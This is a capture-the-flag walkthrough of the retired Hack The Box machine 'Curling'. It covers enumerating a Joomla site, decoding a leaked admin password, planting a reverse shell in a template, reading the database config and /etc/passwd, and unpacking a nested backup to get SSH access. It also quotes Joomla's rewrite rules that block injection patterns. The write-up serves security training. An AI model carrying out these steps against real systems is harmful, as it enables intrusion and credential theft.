# [01 - Curling](https://app.hackthebox.com/machines/Curling)

## description
> 10.10.10.150

|               |             |
|---------------|-------------|
| OS            | Linux       |
| Release Date  | 27 Oct 2018 |
| Difficulty    | Easy        |
| Machine State | Retired     |

## walkthrough

### recon

```
$ nmap -sV -A -sC -Pn -p- curling.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-08 12:12 MDT
Nmap scan report for curling.htb (10.10.10.150)
Host is up (0.065s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### 80

given the name, not a big leap to assume there is a website.

```
HTTP/1.1 200 OK
Date: Fri, 08 Jul 2022 18:12:38 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: c0548020854924e0aecd05ed9f5b672b=gv68lq2s98v3i2833qaelv2i30; path=/; HttpOnly
```

and.. joomla.

gobuster with common.txt finds

```
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/administrator        (Status: 301) [Size: 318] [--> http://curling.htb/administrator/]
/bin                  (Status: 301) [Size: 308] [--> http://curling.htb/bin/]
/cache                (Status: 301) [Size: 310] [--> http://curling.htb/cache/]
/components           (Status: 301) [Size: 315] [--> http://curling.htb/components/]
/images               (Status: 301) [Size: 311] [--> http://curling.htb/images/]
/includes             (Status: 301) [Size: 313] [--> http://curling.htb/includes/]
/index.php            (Status: 200) [Size: 14263]
/language             (Status: 301) [Size: 313] [--> http://curling.htb/language/]
/layouts              (Status: 301) [Size: 312] [--> http://curling.htb/layouts/]
/libraries            (Status: 301) [Size: 314] [--> http://curling.htb/libraries/]
/media                (Status: 301) [Size: 310] [--> http://curling.htb/media/]
/modules              (Status: 301) [Size: 312] [--> http://curling.htb/modules/]
/plugins              (Status: 301) [Size: 312] [--> http://curling.htb/plugins/]
/server-status        (Status: 403) [Size: 276]
/templates            (Status: 301) [Size: 314] [--> http://curling.htb/templates/]
/tmp                  (Status: 301) [Size: 308] [--> http://curling.htb/tmp/]
```

`administrator` takes us to a login to joomla, but all the others are empty folders

using quickhits.txt, found

```
//administrator/logs  (Status: 301) [Size: 323] [--> http://curling.htb/administrator/logs/]
//administrator/      (Status: 200) [Size: 5107]
//cache/              (Status: 200) [Size: 31]
//configuration.php   (Status: 200) [Size: 0]
//htaccess.txt        (Status: 200) [Size: 3005]
//index.phps          (Status: 403) [Size: 276]
//LICENSE.txt         (Status: 200) [Size: 18092]
//README.txt          (Status: 200) [Size: 4872]
//server-status/      (Status: 403) [Size: 276]
//templates/          (Status: 200) [Size: 31]
//tmp                 (Status: 301) [Size: 308] [--> http://curling.htb/tmp/]
//tmp/                (Status: 200) [Size: 31]
//web.config.txt      (Status: 200) [Size: 1690]

```

htaccess.txt highlights
```
## Mod_rewrite in use.

RewriteEngine On

## Begin - Rewrite rules to block out some common exploits.
# If you experience problems on your site then comment out the operations listed
# below by adding a # to the beginning of the line.
# This attempts to block the most common type of exploit `attempts` on Joomla!
#
# Block any script trying to base64_encode data within the URL.
RewriteCond %{QUERY_STRING} base64_encode[^(]*\([^)]*\) [OR]
# Block any script that includes a <script> tag in URL.
RewriteCond %{QUERY_STRING} (<|%3C)([^s]*s)+cript.*(>|%3E) [NC,OR]
# Block any script trying to set a PHP GLOBALS variable via URL.
RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]
# Block any script trying to modify a _REQUEST variable via URL.
RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})
# Return 403 Forbidden header and show the content of the root home page
RewriteRule .* index.php [F]
#
## End - Rewrite rules to block out some common exploits.

## Begin - Custom redirects
#
# If you need to redirect some pages, or set a canonical non-www to
# www redirect (or vice versa), place that code here. Ensure those
# redirects use the correct RewriteRule syntax and the [R=301,L] flags.
#
## End - Custom redirects

##
# Uncomment the following line if your webserver's URL
# is not directly related to physical file paths.
# Update Your Joomla! Directory (just / for root).
##

# RewriteBase /

## Begin - Joomla! core SEF Section.
#
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
#
# If the requested path and file is not /index.php and the request
# has not already been internally rewritten to the index.php script
RewriteCond %{REQUEST_URI} !^/index\.php
# and the requested path and file doesn't directly match a physical file
RewriteCond %{REQUEST_FILENAME} !-f
# and the requested path and file doesn't directly match a physical folder
RewriteCond %{REQUEST_FILENAME} !-d
# internally rewrite the request to the index.php script
RewriteRule .* index.php [L]
#
```

and web.config.txt
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <location path=".">
   <system.webServer>
       <directoryBrowse enabled="false" />
       <rewrite>
           <rules>
               <rule name="Joomla! Rule 1" stopProcessing="true">
                   <match url="^(.*)$" ignoreCase="false" />
                   <conditions logicalGrouping="MatchAny">
                       <add input="{QUERY_STRING}" pattern="base64_encode[^(]*\([^)]*\)" ignoreCase="false" />
                       <add input="{QUERY_STRING}" pattern="(&gt;|%3C)([^s]*s)+cript.*(&lt;|%3E)" />
                       <add input="{QUERY_STRING}" pattern="GLOBALS(=|\[|\%[0-9A-Z]{0,2})" ignoreCase="false" />
                       <add input="{QUERY_STRING}" pattern="_REQUEST(=|\[|\%[0-9A-Z]{0,2})" ignoreCase="false" />
                   </conditions>
                   <action type="CustomResponse" url="index.php" statusCode="403" statusReason="Forbidden" statusDescription="Forbidden" />
               </rule>
               <rule name="Joomla! Rule 2">
                   <match url="(.*)" ignoreCase="false" />
                   <conditions logicalGrouping="MatchAll">
                     <add input="{URL}" pattern="^/index.php" ignoreCase="true" negate="true" />
                     <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
                     <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
                   </conditions>
                   <action type="Rewrite" url="index.php" />
               </rule>
           </rules>
       </rewrite>
   </system.webServer>
   </location>
</configuration>

```

using `joomla-plugins.txt`
```
/components/com_banners/ (Status: 200) [Size: 1786]
/components/com_content/ (Status: 200) [Size: 2182]
/components/com_contact/ (Status: 200) [Size: 2378]
/components/com_mailto/ (Status: 200) [Size: 1780]
/components/com_media/ (Status: 200) [Size: 978]
/components/com_newsfeeds/ (Status: 200) [Size: 1986]
/components/com_search/ (Status: 200) [Size: 1778]
/components/com_users/ (Status: 200) [Size: 2174]
/components/com_wrapper/ (Status: 200) [Size: 1791]
/components/com_wrapper/ (Status: 200) [Size: 1791]
/components/com_wrapper/ (Status: 200) [Size: 1791]
/modules/mod_articles_archive/ (Status: 200) [Size: 1641]
/modules/mod_articles_category/ (Status: 200) [Size: 1647]
/modules/mod_articles_latest/ (Status: 200) [Size: 1635]
/modules/mod_articles_popular/ (Status: 200) [Size: 1641]
/modules/mod_articles_news/ (Status: 200) [Size: 1623]
/modules/mod_breadcrumbs/ (Status: 200) [Size: 1611]
/modules/mod_banners/ (Status: 200) [Size: 1587]
/modules/mod_custom/  (Status: 200) [Size: 1380]
/modules/mod_feed/    (Status: 200) [Size: 1569]
/modules/mod_footer/  (Status: 200) [Size: 1380]
/modules/mod_login/   (Status: 200) [Size: 1575]
/modules/mod_menu/    (Status: 200) [Size: 1569]
/modules/mod_random_image/ (Status: 200) [Size: 1617]
/modules/mod_related_items/ (Status: 200) [Size: 1623]
/modules/mod_search/  (Status: 200) [Size: 1581]
/modules/mod_stats/   (Status: 200) [Size: 1575]
/modules/mod_syndicate/ (Status: 200) [Size: 1599]
/modules/mod_users_latest/ (Status: 200) [Size: 1617]
/modules/mod_whosonline/ (Status: 200) [Size: 1605]
/modules/mod_wrapper/ (Status: 200) [Size: 1587]
```

ok, but we need to know the joomla version before we can look for exploits.

[https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website](https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website) shows us
```
$ curl http://curling.htb/administrator/manifests/files/joomla.xml
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2005 - 2018 Open Source Matters. All rights reserved</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>3.8.8</version>

```

so 3.8.8


don't see any good exploits for this version.

looking at `index.php` harder, see this at the very end:
```html
</body>
      <!-- secret.txt -->
</html>
```

```
$ curl http://curling.htb/secret.txt
Q3VybGluZzIwMTgh
```

tried that with 'admin' to login, but failed.. but that's a b64 string, so

```
$ echo Q3VybGluZzIwMTgh | base64 -d
Curling2018!
```

ok, that doesn't work with `admin` either.. need a username

`http://curling.htb/index.php/2-uncategorised/1-first-post-of-curling2018`:
> Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!
> - Floris

ok that looks like a good username... and it is "Hi Super User", but it looks like all we can do is edit/create posts.

however, now `/administrator` is authenticatable, so we've god access to the joomla control panel.

### joomla administrator

see that mysql is being used in the background, php (of course). quick assessment seems to say that the way forward is to install a malicious joomla extension

.. or even easier - modify the template beez3 `index.php` to just be [rs.php](rs.php)

actually needed to modify the protostar template, but

```
$ nc -lv 4444
nc: getnameinfo: Temporary failure in name resolution
Connection received on curling.htb 52138
Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 19:58:38 up  1:50,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

```
$ cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Cewl Curling site!';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'floris';
        public $password = 'mYsQ!P4ssw0rd$yea!';

```

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
floris:x:1000:1004:floris:/home/floris:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

so floris can login, but www-data can't. the same password for joomla does not work for ssh, and can't su

but..

```
$ ls -l /home/floris/
total 12
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
```

can't get `user.txt` until we pop floris, but `password_backup` is readable

```
$ cat /home/floris/password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

it's a hex dump of.. something

[reader.rb](reader.rb) to make it easier, get us to
```
$ file password_backup.out
password_backup.out: bzip2 compressed data, block size = 900k
$ bunzip2 password_backup.out
bunzip2: Can't guess original name for password_backup.out -- using password_backup.out.out
$ file password_backup.out.out
password_backup.out.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
$ mv password_backup.gz password_backup-with-a-different-name.gz
renamed 'password_backup.gz' -> 'password_backup-with-a-different-name.gz'
$ gunzip password_backup-with-a-different-name.gz
$ file password_backup-with-a-different-name
password_backup-with-a-different-name: bzip2 compressed data, block size = 900k
$ bunzip2 password_backup-with-a-different-name
bunzip2: Can't guess original name for password_backup-with-a-different-name -- using password_backup-with-a-different-name.out
$ file password_backup-with-a-different-name.out
password_backup-with-a-different-name.out: POSIX tar archive (GNU)
$ 7z x password_backup-with-a-different-name.out
$ cat password.txt
5d<wdCbdZu)|hChXll
```

ok, that was annoying.

but...

```
$ ssh -l floris curling.htb
Warning: Permanently added 'curling.htb,10.10.10.150' (ECDSA) to the list of known hosts.
floris@curling.htb's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  8 20:23:34 UTC 2022

  System load:  0.08              Processes:            194
  Usage of /:   49.2% of 9.78GB   Users logged in:      0
  Memory usage: 24%               IP address for ens33: 10.10.10.150
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Wed Sep  8 11:42:07 2021 from 10.10.14.15
floris@curling:~$ cat user.txt
65dd1df0713b40d88ead98cf11b8530b
```

## flag
```
user:
root:
```
